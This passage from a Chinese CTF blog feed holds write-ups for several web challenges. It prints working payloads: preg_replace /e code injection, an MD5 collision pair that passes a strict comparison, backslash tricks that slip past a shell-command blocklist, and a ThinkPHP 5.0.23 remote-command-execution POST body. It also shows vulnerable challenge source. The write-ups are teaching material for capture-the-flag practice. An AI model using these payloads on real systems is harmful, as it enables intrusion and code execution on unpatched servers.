class="line">preg_replace(<span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,$str)</span><br></pre></td></tr></table></div></figure><p>当pattern传入的正则表达式带有/e时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行；</p><p>这里第二个参数固定为<code>strtolower(&quot;\\1&quot;)</code>；<br>这里的<code>\\1</code>实际上体现为<code>\1</code>；<span class="exturl"><a class="exturl__link" href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html">参考</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><strong>反向引用</strong><br>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问</p><p>这里的<code>\1</code>指的是第一个匹配项<br>官方payload/?.*={${phpinfo()}}<br>即</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,&#39;&#123;$&#123;phpinfo()&#125;&#125;&#39;);</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/27/BJDCTF2020-ZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/6.png"></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">但这里存在的问题是，GET方式传的字符串，.会被替换成_，这里采用</span><br><span class="line"></span><br><span class="line">\S*=$&#123;phpinfo()&#125;      <span class="comment"># \S 在php正则表达式中表示匹配所有非空字符，*表示多次匹配</span></span><br></pre></td></tr></table></div></figure><p><span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/2557">文章推荐</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯-2019-easy_web</title>
      <link href="2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/"/>
      <url>2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/1.png"></p><a id="more"></a><p>url栏中有：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0</span><br></pre></td></tr></table></div></figure><p>猜测是Base64加密，后面添加==，解密后为：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MzUzNTM1MmU3MDZlNjc&#x3D;</span><br></pre></td></tr></table></div></figure><p>再次Base64解密：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3535352e706e67</span><br></pre></td></tr></table></div></figure><p>猜测为hex加密的，hex解密 后：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">555.png</span><br></pre></td></tr></table></div></figure><p>文件的总共的加密过程：Hex-&gt;Base64-&gt;Base64</p>        <h2 id="2-抓包">          <a href="#2-抓包" class="heading-link"><i class="fas fa-link"></i></a>2. 抓包</h2>      <p><img src="/2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/2.png"></p><p>可以看到Base对文件进行了加密，通过解密和chrome控制台定位都可以确定是页面的gif的动态图的base64加密后的。</p><p><img src="/2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/3.png"></p>        <h2 id="3-加密">          <a href="#3-加密" class="heading-link"><i class="fas fa-link"></i></a>3. 加密</h2>      <p>有img参数的地方就有文件读取，可以猜想index.php中含有源码</p><p>对index.php进行三次加密：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先Hex编码：696e6465782e706870</span><br><span class="line">再Base64加密：Njk2ZTY0NjU3ODJlNzA2ODcw</span><br><span class="line">再Base64加密：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/4.png"></p><p>右边的响应报文base64解密后：</p><p><img src="/2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/5.png"></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></div></figure>        <h2 id="4-代码审计">          <a href="#4-代码审计" class="heading-link"><i class="fas fa-link"></i></a>4. 代码审计</h2>              <h3 id="4-1-MD5强绕过">          <a href="#4-1-MD5强绕过" class="heading-link"><i class="fas fa-link"></i></a>4.1 MD5强绕过</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line"><span class="comment">//以post形式上传参数字符串a和b，ab不能相等，但是经过MD5加密后需要相等</span></span><br></pre></td></tr></table></div></figure><p>对于一般的MD5强绕过（===）来说，可以直接用数组进行绕过，但是这题用了string强转换，所以利用字符串的MD5强绕过</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2xxxxxxxxxx a=a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br></pre></td></tr></table></div></figure><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br></pre></td></tr></table></div></figure><p>这两串 url 编码进行 urldecode 后 md5 值相同，注意要放进 burp 执行，因为放 hackbar 里会对数据自动进行 url 编码。</p>        <h3 id="4-2-cmd命令执行">          <a href="#4-2-cmd命令执行" class="heading-link"><i class="fas fa-link"></i></a>4.2 cmd命令执行</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br></pre></td></tr></table></div></figure><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) </span><br></pre></td></tr></table></div></figure><p>这里对cmd的参数的关键字进行了正则匹配过滤，因为<code>|\\|\\\\|</code>只对双斜杠和四斜杠进行了过滤，正则中<code>\\\</code>才相当于一个<code>\</code>，对于<code>preg_match</code>这个函数可以通过单反斜杠<code>\</code>进行绕过，也就是说可以</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls  -&gt; l\s</span><br><span class="line">cat -&gt; ca\t</span><br></pre></td></tr></table></div></figure><p><strong>payload：</strong></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmd=ca\t%<span class="number">20</span>/flag</span><br><span class="line">绝对路径：cmd=/bin/ca\t%<span class="number">20</span>/flag</span><br><span class="line">stings读取flag：cmd=strings%<span class="number">20</span>/flag</span><br><span class="line">sort比较读取flag：cmd=sort%<span class="number">20</span>/flag</span><br><span class="line"><span class="comment">//以后空格都尽量用%20代替</span></span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/6.png"></p>        <h3 id="4-3-对于反斜杠的解释">          <a href="#4-3-对于反斜杠的解释" class="heading-link"><i class="fas fa-link"></i></a>4.3 对于反斜杠的解释</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php中：</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\&#x27;;     //报错</span></span><br><span class="line"><span class="string">echo &#x27;</span>\\<span class="string">&#x27;;    //返回\</span></span><br><span class="line"><span class="string">echo &#x27;</span>\\\<span class="string">&#x27;;   //报错</span></span><br><span class="line"><span class="string">echo &#x27;</span>\\\\<span class="string">&#x27;;  //返回\\</span></span><br><span class="line"><span class="string">echo &#x27;</span>\\\\\<span class="string">&#x27;;  //报错</span></span><br><span class="line"><span class="string">echo &#x27;</span>\\\\\\<span class="string">&#x27;;  //返回\\\</span></span><br><span class="line"><span class="string">可以看出当\的数量为基数的时候都报错，偶数的时候返回一半的数量</span></span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/8.png"></p>        <h3 id="4-4-对sort的解释">          <a href="#4-4-对sort的解释" class="heading-link"><i class="fas fa-link"></i></a>4.4 对sort的解释</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sort的定义：</span><br><span class="line">sort将文件的每一行作为一个单位相互比较，比较原则是从首字符向后依次按ASCII码进行比较，最后将它们按升序输出（就是按行排序）。</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/7.png"></p><p>参考：</p><p><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_41463193/article/details/83539168">https://blog.csdn.net/weixin_41463193/article/details/83539168</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://www.thinbug.com/q/28062568">https://www.thinbug.com/q/28062568</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> MD5 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-2nd-old-hack</title>
      <link href="2021/03/20/BJDCTF-2nd-old-hack/"/>
      <url>2021/03/20/BJDCTF-2nd-old-hack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/03/20/BJDCTF-2nd-old-hack/1.png"></p><a id="more"></a><p>可以看到系统提示为thinkphp5漏洞</p>        <h2 id="2-查看系统版本">          <a href="#2-查看系统版本" class="heading-link"><i class="fas fa-link"></i></a>2. 查看系统版本</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;1</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/BJDCTF-2nd-old-hack/2.png"></p><p>看到版本号为5.0.23，搜索一波5.0.23漏洞<br><span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/3845">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="3-远程命令执行漏洞">          <a href="#3-远程命令执行漏洞" class="heading-link"><i class="fas fa-link"></i></a>3. 远程命令执行漏洞</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST格式提交：</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></div></figure><p><img src="/2021/03/20/BJDCTF-2nd-old-hack/3.png"></p><p>参考：<br><span class="exturl"><a class="exturl__link" href="https://www.freebuf.com/vuls/194105.html">https://www.freebuf.com/vuls/194105.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/wuxianbing2012/article/details/104897634">https://blog.csdn.net/wuxianbing2012/article/details/104897634</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF-2019-禁止套娃</title>
      <link href="2021/03/20/GXYCTF-2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/"/>
      <url>2021/03/20/GXYCTF-2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-git泄露源码">          <a href="#1-git泄露源码" class="heading-link"><i class="fas fa-link"></i></a>1. git泄露源码</h2>      <p>GitHack扫描泄露源码</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py <span class="number">-2</span> GitHack.py http://<span class="number">0e91035</span>e<span class="number">-1</span>a9f<span class="number">-4217</span>-a4b2-af6454fe08b0.node3.buuoj.cn/.git</span><br></pre></td></tr></table></div></figure><a id="more"></a><p><img src="/2021/03/20/GXYCTF-2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/1.png"></p><p>泄露源码 index.php，查看：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h2 id="2-分析源码">          <a href="#2-分析源码" class="heading-link"><i class="fas fa-link"></i></a>2. 分析源码</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>]))</span><br></pre></td></tr></table></div></figure><p><strong>[a-z,_]</strong></p><p>这就是匹配任意<strong>字母到_</strong>然后+(?R)? ,后面这个?R是引用当前表达式，形成递归调用，然后继续来匹配。</p><p>也就是说，这里这种代码才能通过匹配</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b(c()));</span><br><span class="line">像下面的这种是不可以的,典型的无参数RCE。：</span><br><span class="line">a(&quot;123&quot;);</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。</span><br><span 